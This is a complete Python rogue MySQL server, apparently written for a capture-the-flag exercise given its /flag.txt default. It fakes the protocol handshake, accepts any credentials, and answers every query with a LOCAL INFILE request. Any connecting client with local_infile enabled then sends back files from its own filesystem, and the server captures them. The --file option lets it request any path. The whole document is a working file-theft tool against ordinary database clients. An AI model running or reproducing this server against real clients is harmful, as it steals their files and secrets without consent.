#!/usr/bin/env python3
"""
A rogue MySQL server.

It speaks just enough of the MySQL client/server protocol (protocol version
10) to get a *client* to hand over a local file:

    server -> Initial Handshake Packet        (seq 0)
    client -> HandshakeResponse41             (seq 1)   [credentials ignored]
    server -> OK                              (seq 2)
    client -> COM_QUERY "SELECT VERSION()"    (seq 0)
    server -> 0xFB + "/flag.txt"              (seq 1)   <-- LOCAL INFILE request
    client -> file contents, 1+ packets       (seq 2..N)
    client -> empty packet                    (seq N+1) <-- end of transfer
    server -> OK                              (seq N+2)

Nothing here ever executes a query: the "LOCAL INFILE request" is a normal,
documented response to *any* command, and a client with local_infile enabled
obeys it without checking that it actually asked to load a file.

Standalone use:
    python3 rogue.py --bind 0.0.0.0:3306 --file /flag.txt

Python 3 standard library only.
"""

import argparse
import socket
import socketserver
import sys
import threading

# --- capability flags (include/mysql_com.h) --------------------------------
CLIENT_LONG_PASSWORD = 0x00000001
CLIENT_FOUND_ROWS = 0x00000002
CLIENT_LONG_FLAG = 0x00000004
CLIENT_CONNECT_WITH_DB = 0x00000008
CLIENT_NO_SCHEMA = 0x00000010
CLIENT_LOCAL_FILES = 0x00000080  # "can use LOAD DATA LOCAL"
CLIENT_PROTOCOL_41 = 0x00000200
CLIENT_INTERACTIVE = 0x00000400
CLIENT_TRANSACTIONS = 0x00002000
CLIENT_SECURE_CONNECTION = 0x00008000
CLIENT_MULTI_RESULTS = 0x00020000
CLIENT_PLUGIN_AUTH = 0x00080000

SERVER_CAPS = (
    CLIENT_LONG_PASSWORD
    | CLIENT_FOUND_ROWS
    | CLIENT_LONG_FLAG
    | CLIENT_CONNECT_WITH_DB
    | CLIENT_NO_SCHEMA
    | CLIENT_LOCAL_FILES
    | CLIENT_PROTOCOL_41
    | CLIENT_INTERACTIVE
    | CLIENT_TRANSACTIONS
    | CLIENT_SECURE_CONNECTION
    | CLIENT_MULTI_RESULTS
    | CLIENT_PLUGIN_AUTH
)

# --- commands --------------------------------------------------------------
COM_QUIT = 0x01
COM_QUERY = 0x03
COM_PING = 0x0E

SERVER_VERSION = b"5.7.44-0ubuntu0.18.04.1"
MAX_PAYLOAD = 0xFFFFFF


# --- packet plumbing -------------------------------------------------------
def frame(payload: bytes, seq: int) -> bytes:
    """3-byte little-endian length + 1-byte sequence id + payload."""
    return len(payload).to_bytes(3, "little") + bytes([seq & 0xFF]) + payload


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def read_packet(sock):
    """Return (payload, seq) or (None, None) when the peer hangs up."""
    head = recv_exact(sock, 4)
    if head is None:
        return None, None
    length = int.from_bytes(head[:3], "little")
    seq = head[3]
    payload = recv_exact(sock, length) if length else b""
    if payload is None:
        return None, None
    return payload, seq


def greeting_packet():
    """Initial Handshake Packet, protocol version 10."""
    salt1 = bytes(range(0x31, 0x39))            # 8 bytes of scramble
    salt2 = bytes(range(0x41, 0x4D))            # 12 more bytes
    p = b"\x0a"                                  # protocol version
    p += SERVER_VERSION + b"\x00"                # human readable version
    p += (1).to_bytes(4, "little")               # connection id
    p += salt1                                   # auth-plugin-data-part-1
    p += b"\x00"                                 # filler
    p += (SERVER_CAPS & 0xFFFF).to_bytes(2, "little")     # capabilities lo
    p += bytes([0x21])                           # charset utf8_general_ci (33)
    p += (0x0002).to_bytes(2, "little")          # status: SERVER_STATUS_AUTOCOMMIT
    p += ((SERVER_CAPS >> 16) & 0xFFFF).to_bytes(2, "little")  # capabilities hi
    p += bytes([21])                             # len(scramble)+1
    p += b"\x00" * 10                            # reserved
    p += salt2 + b"\x00"                         # auth-plugin-data-part-2
    p += b"mysql_native_password\x00"            # auth plugin name
    return p


def ok_packet():
    """OK_Packet for a CLIENT_PROTOCOL_41 connection."""
    return (
        b"\x00"                              # header
        + b"\x00"                            # affected_rows   (lenenc 0)
        + b"\x00"                            # last_insert_id  (lenenc 0)
        + (0x0002).to_bytes(2, "little")     # status flags
        + (0).to_bytes(2, "little")          # warnings
    )


def err_packet(msg, code=1105):
    return (
        b"\xff"
        + code.to_bytes(2, "little")
        + b"#HY000"
        + msg.encode()
    )


def local_infile_packet(path: str):
    """0xFB tells the client: 'send me this file from YOUR filesystem'."""
    return b"\xfb" + path.encode()


# --- the server ------------------------------------------------------------
class RogueState:
    def __init__(self, targets, verbose=True):
        # list of paths to request, one per incoming query
        self.targets = list(targets)
        self.verbose = verbose
        self.lock = threading.Lock()
        self.captured = []          # list of (path, bytes)

    def next_target(self, n):
        return self.targets[n] if n < len(self.targets) else None

    def record(self, path, data):
        with self.lock:
            self.captured.append((path, data))


class RogueHandler(socketserver.BaseRequestHandler):
    state: RogueState = None  # injected by serve()

    def log(self, msg):
        if self.state.verbose:
            print(f"[rogue] {msg}", flush=True)

    def handle(self):
        sock = self.request
        sock.settimeout(30)
        peer = f"{self.client_address[0]}:{self.client_address[1]}"
        self.log(f"connection from {peer}")
        try:
            sock.sendall(frame(greeting_packet(), 0))

            resp, seq = read_packet(sock)
            if resp is None:
                return
            self.log(f"handshake response: {len(resp)} bytes (seq {seq}); "
                     f"user={self._user(resp)!r} - accepting blindly")
            sock.sendall(frame(ok_packet(), seq + 1))

            queries = 0
            while True:
                pkt, seq = read_packet(sock)
                if pkt is None or not pkt:
                    return
                cmd = pkt[0]

                if cmd == COM_QUIT:
                    self.log("COM_QUIT")
                    return

                if cmd == COM_QUERY:
                    query = pkt[1:].decode("utf-8", "replace")
                    target = self.state.next_target(queries)
                    queries += 1
                    self.log(f"COM_QUERY {query!r}")
                    if target is None:
                        sock.sendall(frame(ok_packet(), seq + 1))
                        continue
                    self.log(f"answering with LOCAL INFILE request -> {target}")
                    sock.sendall(frame(local_infile_packet(target), seq + 1))
                    data, last_seq = self._read_infile(sock)
                    self.log(f"client sent {len(data)} bytes for {target}")
                    self.state.record(target, data)
                    sock.sendall(frame(ok_packet(), last_seq + 1))
                    continue

                if cmd == COM_PING:
                    sock.sendall(frame(ok_packet(), seq + 1))
                    continue

                self.log(f"unhandled command 0x{cmd:02x}")
                sock.sendall(frame(err_packet("unsupported"), seq + 1))
        except (socket.timeout, ConnectionError, BrokenPipeError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

    @staticmethod
    def _user(resp):
        """Pull the username out of a HandshakeResponse41 (best effort)."""
        try:
            body = resp[32:]                      # caps(4) maxpkt(4) cs(1) res(23)
            return body.split(b"\x00", 1)[0].decode("utf-8", "replace")
        except Exception:
            return "?"

    @staticmethod
    def _read_infile(sock):
        """Drain file packets until the client sends a zero-length one."""
        data = b""
        last_seq = 0
        while True:
            pkt, seq = read_packet(sock)
            if pkt is None:
                break
            last_seq = seq
            if len(pkt) == 0:        # end of transfer
                break
            data += pkt
        return data, last_seq


def serve(host, port, state, ready=None):
    handler = type("Handler", (RogueHandler,), {"state": state})
    socketserver.TCPServer.allow_reuse_address = True
    srv = socketserver.ThreadingTCPServer((host, port), handler)
    srv.daemon_threads = True
    if ready is not None:
        ready.set()
    return srv


def main():
    ap = argparse.ArgumentParser(description="rogue MySQL server")
    ap.add_argument("--bind", default="0.0.0.0:3306", help="host:port to listen on")
    ap.add_argument(
        "--file",
        action="append",
        default=None,
        help="path to request from the client; repeat to answer several "
             "queries with different paths (default: /flag.txt)",
    )
    args = ap.parse_args()

    host, _, port = args.bind.rpartition(":")
    state = RogueState(args.file or ["/flag.txt"])
    srv = serve(host or "0.0.0.0", int(port), state)
    print(f"[rogue] listening on {host or '0.0.0.0'}:{port}", flush=True)
    print(f"[rogue] will request: {', '.join(state.targets)}", flush=True)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        srv.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
